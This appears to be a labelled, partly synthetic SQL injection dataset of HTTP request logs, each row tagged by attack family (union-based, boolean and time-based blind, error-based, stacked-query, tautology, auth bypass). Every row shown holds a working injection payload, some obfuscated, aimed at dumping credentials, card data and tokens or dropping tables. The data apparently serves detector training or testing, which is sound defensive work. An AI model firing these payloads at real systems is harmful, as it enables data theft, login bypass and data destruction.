time,source_ip,host,method,uri,user_agent,request_body,referer,flow_uid,dup_index,session_id,session_seq,label,attack_family,obfuscated,synthetic_duplicate,forced_unique_nonce,TEMP_benign_augmentation,aug_category
2023-08-13T16:19:08Z,57.68.225.132,37.85.58.9:80,GET,"/lookup?search=1889"" UNION SELECT role,permissions FROM products/*x*/","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,https://www.bing.com/,a_C4JduvEajnXrCjZr6,0,1a580da96628,28,1,union_based,False,False,False,,
2023-07-17T03:54:52Z,197.112.31.83,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username="" UNION SELECT ssn,dob FROM employees-- comment&password=x",-,a_CVztL71REzT4Poki5f,0,24ea6fe19031,257,1,union_based,False,False,False,,
2023-07-10T04:12:27Z,158.67.185.111,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=8274"" ORDER BY 7-- -&password=x",,a_CmTkvu4yLyRXdTZkSg,0,7020e8dc40a9,324,1,error_based,False,False,False,,
2023-08-14T23:20:19Z,65.48.121.40,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=%27/**/UNIoN/**/SElecT/**/NuLl,Null,nuLl,NULL--/**/ComMenT&password=x",https://duckduckgo.com/,a_CMqXOx2U5OSlQU5L2i,0,3eef510aee87,28,1,union_based,True,False,False,,
2023-07-10T04:48:42Z,104.83.80.53,37.85.58.9:80,GET,"/lookup?q=""/**/UniOn/**/sElect/**/nULl,nUlL/**/","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,https://www.google.com/,a_C5O4xC4fIuFNPIWJY8,0,0437664bf8d7,319,1,union_based,True,False,False,,
2023-07-15T18:58:48Z,181.124.35.240,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=10""/**/And/**/10=10/*x*/&password=x",,a_Ck7VMUpxspyJGgq3l,0,19f68c6fbb5c,10,1,boolean_blind,True,False,False,,
2023-07-10T04:12:47Z,158.67.185.111,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username="" UNION SELECT NULL,NULL,NULL,NULL/**/&password=x",https://www.bing.com/,a_Cvr5bu4HbfHy2D6Dvd,0,7020e8dc40a9,325,1,union_based,False,False,False,,
2023-08-13T15:55:23Z,44.214.106.171,37.85.58.9:80,GET,/redirect?term=9335 or X=x-- COMmENt,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CJHTaz1pKzyPCnpHie,0,1dbafeff5892,299,1,tautology,True,False,False,,
2023-07-10T04:12:58Z,158.67.185.111,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=administrator52%27#&password=x,,a_CzMhnX2hLB8Uf8CFS8,0,7020e8dc40a9,326,1,auth_bypass,True,False,False,,
2023-07-15T18:15:49Z,161.132.108.214,37.85.58.9:80,GET,"/catalog?search="" UNION SELECT NULL,NULL#","Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,https://www.google.com/,a_CMf6mY11po4mppVWYf,0,fd4081d9b7cf,155,1,union_based,False,False,False,,
2023-07-15T18:16:24Z,117.27.128.238,37.85.58.9:80,POST,/admin/login.php,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,username=6926; DROP TABLE admin-- -&password=x,,a_CNIxPR2SVWijkuOWxb,0,48868df77119,157,1,stacked_query,False,False,False,,
2023-08-15T06:12:55Z,97.50.240.188,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" AND 9=CAST((SELECT @@version) AS int)-- -&password=x",https://www.google.com/,a_CXHYlu2H9G2iIK44ma,0,c4463e9f2128,359,1,error_based,False,False,False,,
2023-07-17T03:53:40Z,200.49.71.103,37.85.58.9:80,GET,/filter?query=7629; DROP TABLE sessions-- -,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CXwQZf3KmPsYRRHCbh,0,ccdd86bc3838,87,1,stacked_query,False,False,False,,
2023-07-17T10:04:56Z,220.228.166.29,37.85.58.9:80,GET,"/lookup?redirect=9058"" ORDER BY 3/*x*/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CtuLQ831ljLqXiDu89,0,d51bf1e0eb43,10,1,error_based,False,False,False,,
2023-08-15T22:33:58Z,141.94.222.8,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=471"" OR '1'='1'#&password=x",,a_Cw8ODF35u5IDg05Fre,0,3d9c8496db09,282,1,tautology,False,False,False,,
2023-08-15T22:32:47Z,141.94.222.8,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=9813/**/OR/**/a=a#&password=x,https://www.bing.com/,a_ChOTXy1LCyjDEJ7V68,0,3d9c8496db09,283,1,tautology,True,False,False,,
2023-07-17T03:53:38Z,200.49.71.103,37.85.58.9:80,GET,/catalog?id=5991; DROP TABLE employees-- comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CtiJMzQXyz3ErocEf,0,ccdd86bc3838,88,1,stacked_query,False,False,False,,
2023-07-15T18:16:39Z,117.27.128.238,37.85.58.9:80,POST,/admin/login.php,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,username=9297; DROP TABLE admin-- -&password=x,,a_CEevKd9NTr5ruDrBf,0,48868df77119,158,1,stacked_query,False,False,False,,
2023-08-13T15:54:53Z,44.214.106.171,37.85.58.9:80,GET,/browse?redirect=25' AND 25=25-- -,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CC21O04StM63UfBVq,0,1dbafeff5892,300,1,boolean_blind,False,False,False,,
2023-07-15T22:16:19Z,8.83.95.206,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=14""/**/AnD/**/14=14#&password=x",,a_Ceu91c4RVPcTIiCGWb,0,6c06730a2c63,24,1,boolean_blind,True,False,False,,
2023-07-17T03:54:04Z,197.112.31.83,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=' AND 6=CONVERT(int,(SELECT @@version))-- comment&password=x",https://duckduckgo.com/,a_CzCopjskGRDMi6gO4,0,24ea6fe19031,258,1,error_based,False,False,False,,
2023-07-10T04:49:42Z,104.83.80.53,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",username=' WAITFOR DELAY '0:0:15'--&password=x,,a_CvFH4q1G7W8kkPbcn1,0,0437664bf8d7,320,1,time_based_blind,False,False,False,,
2023-08-15T11:41:36Z,116.226.12.245,37.85.58.9:80,GET,"/search?id=9352' UNION SELECT card_number,cvv FROM orders-- -",Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,,,a_C4pSn94qcIpvHXH7Ub,0,079bbd1ed832,26,1,union_based,False,False,False,,
2023-07-17T03:54:25Z,197.112.31.83,37.85.58.9:80,GET,"/browse?redirect=%27/**/AND/**/ExTrActVALuE(5,conCAt(0x7e,(SeLEct/**/@@veRSIon)))/**/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,a_CcsJOuNL8BxH5DWZh,0,24ea6fe19031,259,1,error_based,True,False,False,,
2023-08-14T06:04:48Z,195.196.35.153,37.85.58.9:80,GET,/redirect?q=admin71'#,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CTQgVw1XHQ7XiQTe67,0,9191ebf4951d,11,1,auth_bypass,False,False,False,,
2023-07-17T03:54:41Z,197.112.31.83,37.85.58.9:80,GET,"/browse?name=22"" AND 22=18--","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,a_CmPb0WcVoBd4SXyHc,0,24ea6fe19031,260,1,boolean_blind,False,False,False,,
2023-07-16T02:17:58Z,110.147.12.25,37.85.58.9:80,GET,"/search?ref=18"" AND 18=2/*x*/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CnYdHY1nt31fIsH4T8,0,59d1871631cb,22,1,boolean_blind,False,False,False,,
2023-07-10T21:03:26Z,208.36.106.47,37.85.58.9:80,GET,"/product?term=25"" AND 25=25-- comment","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CrZsFz1AB1jh8yn0Hl,0,158f8836e478,5,1,boolean_blind,True,False,False,,
2023-07-17T03:53:46Z,200.49.71.103,37.85.58.9:80,GET,"/redirect?name=8"" AND 8=16--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CvVKxl1loLK8Mrwkzh,0,ccdd86bc3838,89,1,boolean_blind,False,False,False,,
2023-08-15T22:33:03Z,141.94.222.8,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=""%20UNION%20SELECT%20NULL,NULL,NULL#&password=x",,a_CUj4bm3DuMhVlNOoM6,0,3d9c8496db09,284,1,union_based,True,False,False,,
2023-08-15T22:33:04Z,141.94.222.8,37.85.58.9:80,GET,/lookup?name=8746 OR Z=Z-- -,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CWPLYz1G0lHzOb7T43,0,3d9c8496db09,285,1,tautology,True,False,False,,
2023-08-15T06:12:40Z,97.50.240.188,37.85.58.9:80,GET,/filter?search=' AND 2=CAST((SELECT @@version) AS int)-- -,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CLmRnn4xWznUuqO0v9,0,c4463e9f2128,360,1,error_based,False,False,False,,
2023-08-15T06:13:36Z,97.50.240.188,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=5042 OR A=A--&password=x,https://www.google.com/,a_CqnVmb2iBEJ4Wqlz1,0,c4463e9f2128,361,1,tautology,True,False,False,,
2023-07-16T21:32:58Z,41.134.50.72,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=' AND SLEEP(10)#&password=x,,a_CHmVgb32mCnZrKt736,0,71e8469c4fad,27,1,time_based_blind,False,False,False,,
2023-07-10T04:48:38Z,104.83.80.53,37.85.58.9:80,GET,"/product?q=' aND 9=COnVerT(INt,(selECt @@vErsion))-- -","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,,a_CsaZ6X18SNLH0387t,0,0437664bf8d7,321,1,error_based,True,False,False,,
2023-08-15T22:34:05Z,218.165.157.21,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1","username=19"" AND 19=5/*x*/&password=x",https://duckduckgo.com/,a_CYtwID1cr2j8CSdBp9,0,22c9fbaef137,40,1,boolean_blind,False,False,False,,
2023-07-10T04:12:28Z,158.67.185.111,37.85.58.9:80,GET,/browse?q=3449; DROP TABLE users--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.bing.com/,a_Ci9wd120UE86ivCZEa,0,7020e8dc40a9,327,1,stacked_query,False,False,False,,
2023-07-15T22:16:20Z,8.83.95.206,37.85.58.9:80,GET,"/catalog?id='/**/AnD/**/EXtRaCtvAluE(6,cONCAt(0x7e,(SelECT/**/@@vErsion)))--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CcvWSV1yfs03ani265,0,6c06730a2c63,25,1,error_based,True,False,False,,
2023-08-15T06:13:50Z,97.50.240.188,37.85.58.9:80,GET,"/catalog?name="" UNION SELECT username,password FROM admin--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CBUIQl4qtSnArpZUB2,0,c4463e9f2128,362,1,union_based,False,False,False,,
2023-07-10T12:14:37Z,124.204.242.186,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=8282; DROP TABLE orders/*x*/&password=x,,a_CI5SE30RjImkAG4Ka,0,afcb15864799,28,1,stacked_query,False,False,False,,
2023-07-17T03:54:15Z,197.112.31.83,37.85.58.9:80,GET,/api/items?query=16'/**/AND/**/16=16--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.bing.com/,a_C3IdoW2TUoR8hlmpak,0,24ea6fe19031,261,1,boolean_blind,True,False,False,,
2023-08-13T15:55:18Z,44.214.106.171,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" AND EXTRACTVALUE(5,CONCAT(0x7e,(SELECT @@version)))--&password=x",https://www.google.com/,a_CutJgy15GlOyJwfnvj,0,1dbafeff5892,301,1,error_based,False,False,False,,
2023-08-15T22:33:35Z,141.94.222.8,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=4990' UNION SELECT id,email FROM employees/**/&password=x",https://www.google.com/,a_C2wNzb4iBfORh5OYJg,0,3d9c8496db09,286,1,union_based,False,False,False,,
2023-07-10T04:49:39Z,104.83.80.53,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",username=administrator41'-- -&password=x,https://www.bing.com/,a_C4aYAn2GFpjqjI5Ob2,0,0437664bf8d7,322,1,auth_bypass,False,False,False,,
2023-07-17T03:53:47Z,200.49.71.103,37.85.58.9:80,GET,"/filter?ref="" WAITFOR DELAY '0:0:02'/*x*/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CZLGUV1hIlweY3Aho4,0,ccdd86bc3838,90,1,time_based_blind,False,False,False,,
2023-07-10T04:48:52Z,104.83.80.53,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",username=8723 OR 1=1--&password=x,-,a_CQvgn42fFHTe9hKz9,0,0437664bf8d7,323,1,tautology,False,False,False,,
2023-07-11T01:39:07Z,38.173.164.210,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=admin%27/*x*/&password=x,https://www.google.com/,a_CNX8WS1oiXJK0x1r89,0,f46196979233,23,1,auth_bypass,True,False,False,,
2023-07-15T22:38:48Z,94.12.105.219,37.85.58.9:80,POST,/api/auth,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,username=ADMIniSTrator39'#&password=x,https://duckduckgo.com/,a_CBqYTm1dtu5L6dj6tk,0,ff4b6ba9e33d,35,1,auth_bypass,True,False,False,,
2023-07-15T18:15:54Z,161.132.108.214,37.85.58.9:80,GET,/browse?id=superuser57'#,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,-,a_Cb9Fub2UNc2XMaueAg,0,fd4081d9b7cf,156,1,auth_bypass,False,False,False,,
2023-08-12T21:59:56Z,16.31.198.184,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username='/**/anD/**/ExTRacTValUE(5,coNcat(0x7e,(selEcT/**/@@vErSiOn)))--&password=x",https://duckduckgo.com/,a_CGCXXF32MUxb16GpVc,0,d06437ab58ae,6,1,error_based,True,False,False,,
2023-07-17T03:53:47Z,200.49.71.103,37.85.58.9:80,GET,"/api/items?id="" UNION SELECT token,session_id FROM orders--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CkqRXs2sf1nR5zMM47,0,ccdd86bc3838,91,1,union_based,False,False,False,,
2023-07-16T02:17:59Z,110.147.12.25,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" ANd SlEep(1)--&password=x",,a_CcCRq828Zt33e1UbG5,0,59d1871631cb,23,1,time_based_blind,True,False,False,,
2023-07-15T00:25:15Z,86.226.220.211,37.85.58.9:80,GET,/api/items?redirect=15%27%20AND%2015=10/**/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,,a_CJkjnh1rqZwiIch8S9,0,29f3f4a01035,23,1,boolean_blind,True,False,False,,
2023-08-15T06:13:50Z,97.50.240.188,37.85.58.9:80,GET,"/product?redirect=25""%20ANd%2025=25--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_CZuIwE2JZZHdEemTZ2,0,c4463e9f2128,363,1,boolean_blind,True,False,False,,
2023-08-15T06:13:38Z,97.50.240.188,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=' AND 3=cAst((seLECT @@veRSiON) AS iNT)#&password=x,,a_CxibTE3hXb0o8bd1f7,0,c4463e9f2128,364,1,error_based,True,False,False,,
2023-07-10T04:12:59Z,158.67.185.111,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=sysadmin7'/*x*/&password=x,https://duckduckgo.com/,a_Cp64Mm4N6opP2Twqp,0,7020e8dc40a9,328,1,auth_bypass,True,False,False,,
2023-07-10T04:48:45Z,104.83.80.53,37.85.58.9:80,GET,/api/items?q='/**/And/**/SLeeP(7)/**/,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,-,a_CciA973WfDN4VMrutc,0,0437664bf8d7,324,1,time_based_blind,True,False,False,,
2023-07-15T18:58:48Z,181.124.35.240,37.85.58.9:80,GET,"/search?query=""/**/AND/**/UPDATEXML(1,CONCAT(0x7e,(SELECT/**/VERSION()),0x7e),1)#","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,a_CqsaHL3SSDDK2huZW2,0,19f68c6fbb5c,11,1,error_based,True,False,False,,
2023-08-15T06:12:40Z,97.50.240.188,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=18"" AND 18=4-- -&password=x",-,a_CZKoVA4eubheTahndi,0,c4463e9f2128,365,1,boolean_blind,False,False,False,,
2023-08-15T22:32:51Z,141.94.222.8,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=6210;%20DROP%20TABLE%20admin#&password=x,,a_CSn6HF4Yxdw3xVsCWi,0,3d9c8496db09,287,1,stacked_query,True,False,False,,
2023-07-10T04:12:44Z,158.67.185.111,37.85.58.9:80,GET,/redirect?search=9550' ORDER BY 6/*x*/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_CBlEpM3Yoqkmwy3PN2,0,7020e8dc40a9,329,1,error_based,False,False,False,,
2023-08-15T06:13:41Z,97.50.240.188,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=29"" AND 29=29#&password=x",https://duckduckgo.com/,a_CnMTFl28Gl5RbEsTn1,0,c4463e9f2128,366,1,boolean_blind,False,False,False,,
2023-07-15T18:16:23Z,117.27.128.238,37.85.58.9:80,POST,/admin/login.php,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,"username=' UNION SELECT name,secret_key FROM products#&password=x",,a_CBMUNQ34IlqVZSMF9a,0,48868df77119,159,1,union_based,False,False,False,,
2023-08-15T06:13:24Z,97.50.240.188,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=11%27%20AND%2011=12#&password=x,,a_CSjvNV3rksXu3QHsZk,0,c4463e9f2128,367,1,boolean_blind,True,False,False,,
2023-07-10T04:49:12Z,104.83.80.53,37.85.58.9:80,GET,"/filter?query=6""%20ANd%206=14--","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,https://www.google.com/,a_C2bLNlFLbDidA5swj,0,0437664bf8d7,325,1,boolean_blind,True,False,False,,
2023-08-15T22:33:01Z,141.94.222.8,37.85.58.9:80,GET,"/lookup?search=26"" aND 26=26-- cOmmEnt","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CbFj0T14eS4kNnTknl,0,3d9c8496db09,288,1,boolean_blind,True,False,False,,
2023-07-10T18:56:08Z,159.128.213.18,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",username=4330 OR a=a#&password=x,https://www.google.com/,a_CPVz2a2pc5BIKrotj8,0,cdbe13a4ab98,14,1,tautology,False,False,False,,
2023-07-10T04:49:38Z,104.83.80.53,37.85.58.9:80,GET,"/api/items?term=44' UNION SELECT role,permissions FROM admin#","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,-,a_CVFoH43Qn5hlOSXbq1,0,0437664bf8d7,326,1,union_based,False,False,False,,
2023-07-15T23:27:42Z,13.206.210.252,37.85.58.9:80,POST,/admin/login.php,python-requests/2.31.0,username=test29'/*x*/&password=x,,a_CvfD032HmVR3fxLkic,0,64a5d991f585,25,1,auth_bypass,False,False,False,,
2023-08-15T22:41:30Z,7.38.30.99,37.85.58.9:80,GET,/lookup?q=8698%20or%20x=X/*X*/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,https://www.google.com/,a_CGqsjd1TI1OUBf6Gw4,0,3aa6a65200d8,20,1,tautology,True,False,False,,
2023-07-10T04:49:50Z,104.83.80.53,37.85.58.9:80,GET,/browse?name=superuser12'--/**/-,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,-,a_CFy8TH15WVNUImGyM4,0,0437664bf8d7,327,1,auth_bypass,True,False,False,,
2023-07-17T15:11:17Z,82.124.74.20,37.85.58.9:80,GET,"/browse?id=""/**/WAITFOR/**/DELAY/**/'0:0:20'#","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_CwSCjT1XJYRKfA3oQ3,0,ba2f65c4d107,21,1,time_based_blind,True,False,False,,
